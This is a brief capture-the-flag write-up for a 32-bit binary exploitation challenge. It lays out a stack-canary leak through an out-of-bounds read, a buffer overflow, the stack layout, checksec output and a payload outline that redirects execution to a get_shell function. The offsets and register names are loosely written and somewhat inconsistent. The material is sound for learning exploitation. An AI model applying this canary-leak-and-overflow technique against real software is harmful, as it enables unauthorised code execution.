**Read source code**
- Vuln in case `P` and `E`
  + Case `P`: out of bounds => we can access data outside of box => leak canary
  + Case `E`: `scanf`,`read` => Buffer overflow
- `get_shell`: 0x080486b9
- Stack
```
idx (ebp - 0x94)
name_len (ebp - 0x90)
select (ebp - 0x8a)
box (ebp - 0x88)
name (ebp - 0x48)
canary (rbp-0x4)
rbp
ret (rbp+0x4)
```
- Distance from box to canary: 0x88 - 0x4 (from 128 to 131)
- `Checksec` in gdb
```
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
- So the idea is that use case `P` to leak canary, then use `E` to overwrite the ret addr with get_shell
---  
***PWNTOOLS***
- while loop from i = 128 to 131 (leak canary)
- payload = (0x48-0x8)*'a' + canary + 0x8 + get_shell
